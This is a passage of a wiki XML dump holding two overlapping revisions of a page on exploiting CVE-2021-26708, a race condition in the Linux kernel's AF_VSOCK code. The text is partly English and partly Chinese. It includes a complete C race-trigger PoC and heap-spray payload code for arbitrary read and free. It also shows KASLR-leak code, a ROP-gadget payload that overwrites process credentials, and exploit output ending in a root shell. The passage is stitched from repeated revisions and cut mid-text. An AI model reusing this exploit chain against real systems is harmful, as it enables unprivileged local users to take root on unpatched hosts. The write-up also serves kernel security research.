}
&lt;/pre&gt;

The size value here is taken from the number of nanoseconds returned by &lt;code&gt;clock_gettime()&lt;/code&gt;, which may be different each time. The original syzkaller will not do this, because when syzkaller generates fuzzing input, the value of the syscall parameter is determined and will not change during execution.

== The power of four bytes ==

Here I choose Fedora 33 Server as the research target, the kernel version is 5.10.11-200.fc33.x86_64, and I am determined to bypass SMEP and SMAP.

In the first step, I started to study stable heap spraying, which exploited the execution of user space activities to cause the kernel to allocate another 64-byte object at the location of the released virtio_vsock_sock. After several experimental attempts, it was confirmed that the released virtio_vsock_sock was overwritten, indicating that heap spraying is feasible. Finally I found msgsnd() syscall. It creates struct msg_msg in the kernel space, see pahole output:
&lt;pre&gt;
struct msg_msg {
    struct list_head           m_list;               /*     0    16 */
    long int                   m_type;               /*    16     8 */
    size_t                     m_ts;                 /*    24     8 */
    struct msg_msgseg *        next;                 /*    32     8 */
    void *                     security;             /*    40     8 */

    /* size: 48, cachelines: 1, members: 5 */
    /* last cacheline: 48 bytes */
};
&lt;/pre&gt;

The front is the message header, and the back is the message data. If the struct msgbuf in the user space has a 16-byte mtext, the corresponding msg_msg will be created in the kmalloc-64 block cache. A 4-byte write-after-free will destroy the void *security pointer at offset 40. The msg_msg.security field points to the kernel data allocated by lsm_msg_msg_alloc(). When msg_msg is received, it will be released by security_msg_msg_free(). Therefore, by destroying the first half of the security pointer, arbitrary free can be obtained.

==Kernel Information Leak==

Here is used [https://www.pwnwiki.org/index.php?title=CVE-2019-18683_Linux_kernel_through_5.3.8_%E7%89%B9%E6%AC%8A%E6%8F%90%E5%8D %87%E6%BC%8F%E6%B4%9E CVE-2019-18683] the same technique. The second connect() of the virtual socket calls &lt;code&gt;vsock_deassign_transport()&lt;/code&gt; and sets &lt;code&gt;vsk-&gt;transport&lt;/code&gt; to NULL, making &lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt; Calling &lt;code&gt;virtio_transport_send_pkt_info()&lt;/code&gt; after the memory crash, a kernel warning appears:
&lt;pre&gt;
WARNING: CPU: 1 PID: 6739 at net/vmw_vsock/virtio_transport_common.c:34
...
CPU: 1 PID: 6739 Comm: racer Tainted: G        W         5.10.11-200.fc33.x86_64 #1
Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.13.0-2.fc32 04/01/2014
RIP: 0010:virtio_transport_send_pkt_info+0x14d/0x180 [vmw_vsock_virtio_transport_common]
...
RSP: 0018:ffffc90000d07e10 EFLAGS: 00010246
RAX: 0000000000000000 RBX: ffff888103416ac0 RCX: ffff88811e845b80
RDX: 00000000ffffffff RSI: ffffc90000d07e58 RDI: ffff888103416ac0
RBP: 0000000000000000 R08: 00000000052008af R09: 0000000000000000
R10: 0000000000000126 R11: 0000000000000000 R12: 0000000000000008
R13: ffffc90000d07e58 R14: 0000000000000000 R15: ffff888103416ac0
FS:  00007f2f123d5640(0000) GS:ffff88817bd00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007f81ffc2a000 CR3: 000000011db96004 CR4: 0000000000370ee0
Call Trace:
  virtio_transport_notify_buffer_size+0x60/0x70 [vmw_vsock_virtio_transport_common]
  vsock_update_buffer_size+0x5f/0x70 [vsock]
  vsock_stream_setsockopt+0x128/0x270 [vsock]
...
&lt;/pre&gt;
Through gdb debugging, it is found that the RCX register contains the kernel address of the released virtio_vsock_sock, and the RBX register contains the kernel address of vsock_sock.

==Achieve arbitrary reading==

===From arbitrary free to use-after-free===

Release an object from the leaked kernel address
Perform heap spray and cover the object with controlled data
Use damaged objects for privilege escalation
The System V message implemented by the kernel has a maximum limit of DATALEN_MSG, that is, PAGE_SIZE minus sizeof(struct msg_msg)). If you send a larger message, the remaining messages will be saved in the list of message segments. The msg_msg contains struct msg_msgseg *next to point to the first segment, and size_t m_ts is used to store the size. When performing an overwrite operation, you can put the controlled value in msg_msg.m_ts and msg_msg.next:

[[File:T01a51dfe7a996e854c.png | 600px ]]


Payload:
&lt;pre&gt;
    #define PAYLOAD_SZ 40 
    void adapt_xattr_vs_sysv_msg_spray(unsigned long kaddr)
    {
        struct msg_msg *msg_ptr;

        xattr_addr = spray_data + PAGE_SIZE * 4 - PAYLOAD_SZ;

        /* Don't touch the second part to avoid breaking page fault delivery */
        memset(spray_data, 0xa5, PAGE_SIZE * 4);

        printf("[+] adapt the msg_msg spraying payload:\n");
        msg_ptr = (struct msg_msg *)xattr_addr;
        msg_ptr-&gt;m_type = 0x1337;
        msg_ptr-&gt;m_ts = ARB_READ_SZ;
        msg_ptr-&gt;next = (struct msg_msgseg *)kaddr; /* set the segment ptr for arbitrary read */
        printf("\tmsg_ptr %p\n\tm_type %lx at %p\n\tm_ts %zu at %p\n\tmsgseg next %p at %p\n",
               msg_ptr,
               msg_ptr-&gt;m_type, &amp;(msg_ptr-&gt;m_type),
               msg_ptr-&gt;m_ts, &amp;(msg_ptr-&gt;m_ts),
               msg_ptr-&gt;next, &amp;(msg_ptr-&gt;next));
    }
&lt;/pre&gt;
But how to use msg_msg to read kernel data? By reading the msgrcv() system call documentation, I found a good solution, using msgrcv() and MSG flags:
&lt;pre&gt;
MSG_COPY (since Linux 3.8)
        Nondestructively fetch a copy of the message at the ordinal position  in  the  queue
        specified by msgtyp (messages are considered to be numbered starting at 0).
&lt;/pre&gt;
This flag causes the kernel to copy the message data to the user space without deleting it from the message queue. If the kernel has CONFIG_CHECKPOINT_RESTORE=y, then MSG is available and applicable in Fedora Server.

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
===任意讀的步驟===
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
準備工作：
使用sched_getaffinity()和CPU_COUNT()計算可用的CPU數量（該漏洞至少需要兩個）;
打開/dev/kmsg進行解析;
mmap()將spray_data內存區域配置userfaultfd()作為最後一部分;
啟動一個單獨的pthread來處理userfaultfd()事件;
啟動127個threads用於msg_msg上的setxattr()&amp;userfaultfd()堆噴射，並將它們掛在thread_barrier上;
獲取原始msg_msg的內核地址:
在虛擬套接字上進行條件競爭;
在第二個connect()後，在忙循環中等待35微秒;
調用msgsnd()來建立一個單獨的消息隊列；在內存破壞後，msg_msg對像被放置在virtio_vsock_sock位置;
解析內核日誌，從內核警告（RCX寄存器）中保存msg_msg的內核地址;
同時，從RBX寄存器中保存vsock_sock的內核地址;
使用損壞的 msg_msg對原始msg_msg執行任意釋放:
使用原始 msg_msg地址的4個字節作為 SO_VM_SOCKETS_BUFFER_SIZE，用於實現內存破壞；
在虛擬套接字上進行條件競爭；
在第二個connect()之後馬上調用msgsnd()；msg_msg被放置在virtio_vsock_sock的位置，實現破壞；
現在被破壞的msg_msg的security指針存儲原始msg_msg的地址(來自步驟2)；
&lt;/div&gt;

[[File:T01a2a2d47c9494c4a5.png | 600px ]]

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
如果在處理 msgsnd() 的過程中發生了來自 setsockopt()線程的 msg_msg.security內存損壞，進而SELinux權限檢查失敗；
在這種情況下，msgsnd()返回-1，損壞的msg_msg被銷毀；釋放msg_msg.security可以釋放原始msg_msg；
用一個可控的payload 覆蓋原始msg_msg：
msgsnd()失敗後，漏洞就會調用pthread_barrier_wait()，調用127個用於堆噴射的pthreads；
這些pthreads執行setxattr()的payload；
原始msg_msg被可控的數據覆蓋，msg_msg.next指針存儲vsock_sock對象的地址；
&lt;/div&gt;

[[File:T0140baae964febb059.png | 600px ]]

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
通過從存儲被覆蓋的 msg_msg的消息隊列中接收消息，將vsock_sock內核對象的內容讀到用戶空間：
&lt;/div&gt;
&lt;pre&gt;
ret = msgrcv(msg_locations[0].msq_id, kmem, ARB_READ_SZ, 0,
                IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
&lt;/pre&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
==尋找攻擊目標==
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
以下是我找到的點：
1.專用的塊緩存，如PINGv6和sock_inode_cache有很多指向對象的指針
2.struct mem_cgroup *sk_memcg指針在vsock_sock.sk偏移量664處。 mem_cgroup結構是在kmalloc-4k塊緩存中分配的。
3.const struct cred *owner指針在vsock_sock.sk偏移量840處，存儲了可以覆蓋進行權限升級的憑證的地址。
4.void (*sk_write_space)(struct sock *)函數指針在vsock_sock.sk偏移量688處，被設置為sock_def_write_space()內核函數的地址。它可以用來計算KASLR偏移量。
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
下面是該漏洞如何從內存中提取這些指針:
&lt;/div&gt;

&lt;pre&gt;
#define SK_MEMCG_RD_LOCATION    (DATALEN_MSG + SK_MEMCG_OFFSET)
#define OWNER_CRED_OFFSET    840
#define OWNER_CRED_RD_LOCATION    (DATALEN_MSG + OWNER_CRED_OFFSET)
#define SK_WRITE_SPACE_OFFSET    688
#define SK_WRITE_SPACE_RD_LOCATION (DATALEN_MSG + SK_WRITE_SPACE_OFFSET) 
/*
 * From Linux kernel 5.10.11-200.fc33.x86_64:
 *   function pointer for calculating KASLR secret
 */
#define SOCK_DEF_WRITE_SPACE    0xffffffff819851b0lu 
unsigned long sk_memcg = 0;
unsigned long owner_cred = 0;
unsigned long sock_def_write_space = 0;
unsigned long kaslr_offset = 0;

/* ... */

    sk_memcg = kmem[SK_MEMCG_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sk_memcg %lx (offset %ld in the leaked kmem)\n",
            sk_memcg, SK_MEMCG_RD_LOCATION);

    owner_cred = kmem[OWNER_CRED_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found owner cred %lx (offset %ld in the leaked kmem)\n",
            owner_cred, OWNER_CRED_RD_LOCATION);

    sock_def_write_space = kmem[SK_WRITE_SPACE_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sock_def_write_space %lx (offset %ld in the leaked kmem)\n",
            sock_def_write_space, SK_WRITE_SPACE_RD_LOCATION);

    kaslr_offset = sock_def_write_space - SOCK_DEF_WRITE_SPACE;
    printf("[+] Calculated kaslr offset: %lx\n", kaslr_offset);
&lt;/pre&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
==在 sk_buff 上實現 Use-after-free==
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
Linux內核中與網絡相關的緩衝區用struct sk_buff表示，這個對像中有skb_shared_info與destructor_arg，可以用於控制流劫持。網絡數據和skb_shared_info被放置在由sk_buff.head指向的同一個內核內存塊中。因此，在用戶空間中創建一個2800字節的網絡數據包會使skb_shared_info被分配到kmalloc-4k塊緩存中，mem_cgroup對像也是如此。
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
我構建了以下步驟：
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
1.使用socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)創建一個客戶端套接字和32個服務器套接字
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
2.在用戶空間中準備一個2800字節的緩衝區，並用0x42對其memset()
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
3.用sendto()將這個緩衝區從客戶端套接字發送到每個服務器套接字，用於在kmalloc-4k中創建sk_buff對象。在每個可用的CPU上使用`sched_setaffinity()
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
4.對vsock_sock執行任意讀取過程
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
5.計算可能的sk_buff內核地址為sk_memcg加4096(kmalloc-4k的下一個元素)
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
6.對這個可能的sk_buff地址執行任意讀
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
7.如果在網絡數據的位置找到0x42424242424242lu，則找到真正的sk_buff，進入步驟8。否則，在可能的sk_buff地址上加4096，轉到步驟6
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
8.sk_buff上執行32個pthreads的setxattr()&amp;userfaultfd()堆噴射，並把它們掛在pthread_barrier上
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
9.對sk_buff內核地址進行任意釋放
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
10.調用pthread_barrier_wait()，執行32個setxattr()覆蓋skb_shared_info的堆噴pthreads
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
11.使用recv()接收服務器套接字的網絡消息。
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
==通過skb_shared_info 進行任意寫==
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
以下是覆蓋sk_buff對象的有效payload：
&lt;/div&gt;

&lt;pre&gt;
#define SKB_SIZE        4096
#define SKB_SHINFO_OFFSET    3776
#define MY_UINFO_OFFSET        256
#define SKBTX_DEV_ZEROCOPY    (1 &lt;&lt; 3) 
void prepare_xattr_vs_skb_spray(void)
{
    struct skb_shared_info *info = NULL;

    xattr_addr = spray_data + PAGE_SIZE * 4 - SKB_SIZE + 4;

    /* Don't touch the second part to avoid breaking page fault delivery */
    memset(spray_data, 0x0, PAGE_SIZE * 4);

    info = (struct skb_shared_info *)(xattr_addr + SKB_SHINFO_OFFSET);
    info-&gt;tx_flags = SKBTX_DEV_ZEROCOPY;
    info-&gt;destructor_arg = uaf_write_value + MY_UINFO_OFFSET;

    uinfo_p = (struct ubuf_info *)(xattr_addr + MY_UINFO_OFFSET);
&lt;/pre&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
skb_shared_info駐留在噴射數據中，正好在偏移量SKB_SHINFO_OFFSET處，即3776字節。 skb_shared_info.destructor_arg指針存儲了struct ubuf_info的地址。因為被攻擊的sk_buff的內核地址是已知的，所以能在網絡緩衝區的MY_UINFO_OFFSET處創建了一個假的ubuf_info。下面是有效payload的佈局：
&lt;/div&gt;

[[File:T0185ccbf9f025c74da.png  | 600px]]

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
下面講講destructor_arg 回調:
&lt;/div&gt;
&lt;pre&gt;
 /*
     * A single ROP gadget for arbitrary write:
     *   mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rdx + rcx*8], rsi ; ret
     * Here rdi stores uinfo_p address, rcx is 0, rsi is 1
     */
    uinfo_p-&gt;callback = ARBITRARY_WRITE_GADGET + kaslr_offset;
    uinfo_p-&gt;desc = owner_cred + CRED_EUID_EGID_OFFSET; /* value for "qword ptr [rdi + 8]" */
    uinfo_p-&gt;desc = uinfo_p-&gt;desc - 1; /* rsi value 1 should not get into euid */
&lt;/pre&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
由於在vmlinuz-5.10.11-200.fc33.x86_64中找不到一個能滿足我需求的gadget，所以我自己進行了研究構造。
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
callback函數指針存儲一個ROP gadget 地址，RDI存儲callback函數的第一個參數，也就是ubuf_info本身的地址，RDI + 8指向ubuf_info.desc。 gadget 將ubuf_info.desc移動到RDX。現在RDX包含有效用戶ID和組ID的地址減一個字節。這個字節很重要：當gadget從 RSI向 RDX指向的內存中寫入消息1時，有效的 uid和 gid將被零覆蓋。重複同樣的過程，直到權限升級到root。整個過程輸出流如下：
&lt;/div&gt;
&lt;pre&gt;
[a13x@localhost ~]$ ./vsock_pwn

=================================================
==== CVE-2021-26708 PoC exploit by a13xp0p0v ====
=================================================

[+] begin as: uid=1000, euid=1000
[+] we have 2 CPUs for racing
[+] getting ready...
[+] remove old files for ftok()
[+] spray_data at 0x7f0d9111d000
[+] userfaultfd #1 is configured: start 0x7f0d91121000, len 0x1000
[+] fault_handler for uffd 38 is ready

[+] stage I: collect good msg_msg locations
[+] go racing, show wins: 
    save msg_msg ffff9125c25a4d00 in msq 11 in slot 0
    save msg_msg ffff9125c25a4640 in msq 12 in slot 1
    save msg_msg ffff9125c25a4780 in msq 22 in slot 2
    save msg_msg ffff9125c3668a40 in msq 78 in slot 3

[+] stage II: arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4d00
    kaddr for arb read: ffff9125c2035300
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c2035300 at 0x7f0d91120ff8
[+] go racing, show wins: 

[+] stage III: arbitrary read vsock via good overwritten msg_msg (msq 11)
[+] msgrcv returned 6096 bytes
[+] Found sk_memcg ffff9125c42f9000 (offset 4712 in the leaked kmem)
[+] Found owner cred ffff9125c3fd6e40 (offset 4888 in the leaked kmem)
[+] Found sock_def_write_space ffffffffab9851b0 (offset 4736 in the leaked kmem)
[+] Calculated kaslr offset: 2a000000

[+] stage IV: search sprayed skb near sk_memcg...
[+] checking possible skb location: ffff9125c42fa000
[+] stage IV part I: repeat arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4640
    kaddr for arb read: ffff9125c42fa030
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c42fa030 at 0x7f0d91120ff8
[+] go racing, show wins: 0 0 20 15 42 11 
[+] stage IV part II: arbitrary read skb via good overwritten msg_msg (msq 12)
[+] msgrcv returned 6096 bytes
[+] found a real skb

[+] stage V: try to do UAF on skb at ffff9125c42fa000
[+] skb payload:
    start at 0x7f0d91120004
    skb_shared_info at 0x7f0d91120ec4
    tx_flags 0x8
    destructor_arg 0xffff9125c42fa100
    callback 0xffffffffab64f6d4
    desc 0xffff9125c3fd6e53
[+] go racing, show wins: 15 

[+] stage VI: repeat UAF on skb at ffff9125c42fa000
[+] go racing, show wins: 0 12 13 15 3 12 4 16 17 18 9 47 5 12 13 9 13 19 9 10 13 15 12 13 15 17 30 

[+] finish as: uid=0, euid=0
[+] starting the root shell...
uid=0(root) gid=0(root) groups=0(root),1000(a13x) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
&lt;/pre&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
==視頻==
&lt;/div&gt;
&lt;youtube&gt;https://www.youtube.com/watch?v=EC8PFOYOUgU&lt;/youtube&gt;


&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
==參考==
&lt;/div&gt;
https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html</text>
      <sha1>nvoxtj5n9idw2dcf2nodd0b7ixnutra</sha1>
    </revision>
    <revision>
      <id>2213</id>
      <parentid>2183</parentid>
      <timestamp>2021-05-04T03:40:35Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "The network-related buffer in the Linux kernel is represented by struct sk_buff. There are skb_shared_info and destructor_arg in this object, which can be used for control flo..."</comment>
      <origin>2213</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="25513" sha1="sfmbuzt0gf8vdyflkpo8iad4xa0vvo6" xml:space="preserve">&lt;languages  /&gt;
==Vulnerability==

These vulnerabilities are race conditions caused by incorrect locking in &lt;code&gt;net/vmw_vsock/af_vsock.c&lt;/code&gt;. These conditional competitions were implicitly introduced in the submission that added VSOCK multi-transport support in November 2019, and were merged into the Linux kernel 5.5-rc1 version.

&lt;code&gt;CONFIG_VSOCKETS&lt;/code&gt; and &lt;code&gt;CONFIG_VIRTIO_VSOCKETS&lt;/code&gt; are provided as kernel modules in all major GNU/Linux distributions. When you create a socket for the AF_VSOCK domain, these vulnerable modules are automatically loaded.
&lt;pre&gt;
vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
&lt;/pre&gt;

The creation of &lt;code&gt;AF_VSOCK&lt;/code&gt; sockets is available to non-privileged users and does not require user name space.


==Memory corruption==

The following is a detailed introduction to the use of CVE-2021-26708, using the conditional competition in &lt;code&gt;vsock_stream_etssockopt()&lt;/code&gt;. Two threads are required to reproduce. The first thread calls &lt;code&gt;setsockopt()&lt;/code&gt; :
&lt;pre&gt;
  setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
                &amp;size, sizeof(unsigned long));
&lt;/pre&gt;



The second thread changes the virtual socket transmission when &lt;code&gt;vsock_stream_etssockopt()&lt;/code&gt; tries to acquire the socket lock, by reconnecting the virtual socket:
&lt;pre&gt;
struct sockaddr_vm addr = {
        .svm_family = AF_VSOCK,
    };

    addr.svm_cid = VMADDR_CID_LOCAL;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

    addr.svm_cid = VMADDR_CID_HYPERVISOR;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));
&lt;/pre&gt;


In order to process the &lt;code&gt;connect()&lt;/code&gt; of the virtual socket, the kernel executes &lt;code&gt;vsock_stream_connect()&lt;/code&gt; which calls &lt;code&gt;vsock_assign_transport()&lt;/code&gt;. This function contains the following code:
&lt;pre&gt;
     if (vsk-&gt;transport) {
            if (vsk-&gt;transport == new_transport)
                return 0;

            /* transport-&gt;release() must be called with sock lock acquired.
             * This path can only be taken during vsock_stream_connect(),
             * where we have already held the sock lock.
             * In the other cases, this function is called on a new socket
             * which is not assigned to any transport.
             */
            vsk-&gt;transport-&gt;release(vsk);
            vsock_deassign_transport(vsk);
        }
&lt;/pre&gt;

&lt;code&gt;vsock_stream_connect()&lt;/code&gt; contains a socket lock, and &lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt; in the parallel thread also tries to obtain it, which constitutes a conditional competition. Therefore, when the second &lt;code&gt;connect()&lt;/code&gt; is performed with a different &lt;code&gt;svm_cid&lt;/code&gt;, the &lt;code&gt;vsock_deassign_transport()&lt;/code&gt; function is called. This function executes &lt;code&gt;virtio_transport_destruct()&lt;/code&gt;, releases &lt;code&gt;vsock_sock.trans&lt;/code&gt;, and &lt;code&gt;vsk-&gt;transport&lt;/code&gt; is set to NULL. When &lt;code&gt;vsock_stream_connect()&lt;/code&gt; releases the socket lock, &lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt; can continue to execute. It calls &lt;code&gt;vsock_update_buffer_size()&lt;/code&gt;, and then calls &lt;code&gt;transport-&gt;notify_buffer_size()&lt;/code&gt;. Here transport contains an outdated value from a local variable, which does not match &lt;code&gt;vsk-&gt;transport&lt;/code&gt; (the original value is set to NULL).

When the kernel executes &lt;code&gt;virtio_transport_notify_buffer_size()&lt;/code&gt;, memory corruption occurs:
&lt;pre&gt;
void virtio_transport_notify_buffer_size(struct vsock_sock *vsk, u64 *val)
{
    struct virtio_vsock_sock *vvs = vsk-&gt;trans;

    if (*val &gt; VIRTIO_VSOCK_MAX_BUF_SIZE)
        *val = VIRTIO_VSOCK_MAX_BUF_SIZE;

    vvs-&gt;buf_alloc = *val;

    virtio_transport_send_credit_update(vsk, VIRTIO_VSOCK_TYPE_STREAM, NULL);
}
&lt;/pre&gt;

Here, vvs is a pointer to the kernel memory, which has been released in &lt;code&gt;virtio_transport_destruct()&lt;/code&gt;. The size of &lt;code&gt;struct virtio_vsock_sock&lt;/code&gt; is 64 bytes and is located in the kmalloc-64 block cache. The buf_alloc field type is u32 and is located at offset 40. &lt;code&gt;VIRTIO_VSOCK_MAX_BUF_SIZE is 0xFFFFFFFFUL&lt;/code&gt;. The value of *val is controlled by the attacker, and its four least important bytes are written into the freed memory.


==Fuzzing==

The syzkaller fuzzer has no way to reproduce this crash, so I decided to study it myself. But why does the fuzzer fail? Observe &lt;code&gt;vsock_update_buffer_size()&lt;/code&gt; and find out:
&lt;pre&gt;
 if (val != vsk-&gt;buffer_size &amp;&amp;
      transport &amp;&amp; transport-&gt;notify_buffer_size)
        transport-&gt;notify_buffer_size(vsk, &amp;val);

    vsk-&gt;buffer_size = val;

&lt;/pre&gt;

Only when val is different from the current buffer_size, will &lt;code&gt;notify_buffer_size()&lt;/code&gt; be called, that is to say, when &lt;code&gt;setsockopt()&lt;/code&gt; executes &lt;code&gt;SO_VM_SOCKETS_BUFFER_SIZE&lt;/code&gt;, every time The size parameters of the call should all be different. So I built the relevant code:
&lt;pre&gt;
/*
 * AF_VSOCK vulnerability trigger.
 * It's a PoC just for fun.
 * Author: Alexander Popov &lt;alex.popov@linux.com&gt;.
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;pthread.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;linux/vm_sockets.h&gt;
#include &lt;unistd.h&gt;

#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define MAX_RACE_LAG_USEC 50

int vsock = -1;
int tfail = 0;
pthread_barrier_t barrier;

int thread_sync(long lag_nsec)
{
	int ret = -1;
	struct timespec ts0;
	struct timespec ts;
	long delta_nsec = 0;

	ret = pthread_barrier_wait(&amp;barrier);
	if (ret != 0 &amp;&amp; ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		perror("[-] pthread_barrier_wait");
		return EXIT_FAILURE;
	}

	ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts0);
	if (ret != 0) {
		perror("[-] clock_gettime");
		return EXIT_FAILURE;
	}

	while (delta_nsec &lt; lag_nsec) {
		ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts);
		if (ret != 0) {
			perror("[-] clock_gettime");
			return EXIT_FAILURE;
		}

		delta_nsec = (ts.tv_sec - ts0.tv_sec) * 1000000000 +
						ts.tv_nsec - ts0.tv_nsec;
	}

	return EXIT_SUCCESS;
}

void *th_connect(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
	};

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	addr.svm_cid = VMADDR_CID_LOCAL;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	addr.svm_cid = VMADDR_CID_HYPERVISOR;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	return NULL;
}

void *th_setsockopt(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct timespec tp;
	unsigned long size = 0;

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	clock_gettime(CLOCK_MONOTONIC, &amp;tp);
	size = tp.tv_nsec;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
						&amp;size, sizeof(unsigned long));

	return NULL;
}

int main(void)
{
	int ret = -1;
	unsigned long size = 0;
	long loop = 0;
	pthread_t th[2] = { 0 };

	vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (vsock == -1)
		err_exit("[-] open vsock");

	printf("[+] AF_VSOCK socket is opened\n");

	size = 1;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE,
						&amp;size, sizeof(unsigned long));
	size = 0xfffffffffffffffdlu;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE,
						&amp;size, sizeof(unsigned long));

	ret = pthread_barrier_init(&amp;barrier, NULL, 2);
	if (ret != 0)
		err_exit("[-] pthread_barrier_init");

	for (loop = 0; loop &lt; 30000; loop++) {
		long tmo1 = 0;
		long tmo2 = loop % MAX_RACE_LAG_USEC;

		printf("race loop %ld: tmo1 %ld, tmo2 %ld\n", loop, tmo1, tmo2);

		ret = pthread_create(&amp;th[0], NULL, th_connect, &amp;tmo1);
		if (ret != 0)
			err_exit("[-] pthread_create #0");

		ret = pthread_create(&amp;th[1], NULL, th_setsockopt, &amp;tmo2);
		if (ret != 0)
			err_exit("[-] pthread_create #1");

		ret = pthread_join(th[0], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #0");

		ret = pthread_join(th[1], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #1");

		if (tfail) {
			printf("[-] some thread got troubles\n");
			exit(EXIT_FAILURE);
		}
	}

	ret = close(vsock);
	if (ret)
		perror("[-] close");

	printf("[+] now see your warnings in the kernel log\n");
	return 0;
}
&lt;/pre&gt;

The size value here is taken from the number of nanoseconds returned by &lt;code&gt;clock_gettime()&lt;/code&gt;, which may be different each time. The original syzkaller will not do this, because when syzkaller generates fuzzing input, the value of the syscall parameter is determined and will not change during execution.

== The power of four bytes ==

Here I choose Fedora 33 Server as the research target, the kernel version is 5.10.11-200.fc33.x86_64, and I am determined to bypass SMEP and SMAP.

In the first step, I started to study stable heap spraying, which exploited the execution of user space activities to cause the kernel to allocate another 64-byte object at the location of the released virtio_vsock_sock. After several experimental attempts, it was confirmed that the released virtio_vsock_sock was overwritten, indicating that heap spraying is feasible. Finally I found msgsnd() syscall. It creates struct msg_msg in the kernel space, see pahole output:
&lt;pre&gt;
struct msg_msg {
    struct list_head           m_list;               /*     0    16 */
    long int                   m_type;               /*    16     8 */
    size_t                     m_ts;                 /*    24     8 */
    struct msg_msgseg *        next;                 /*    32     8 */
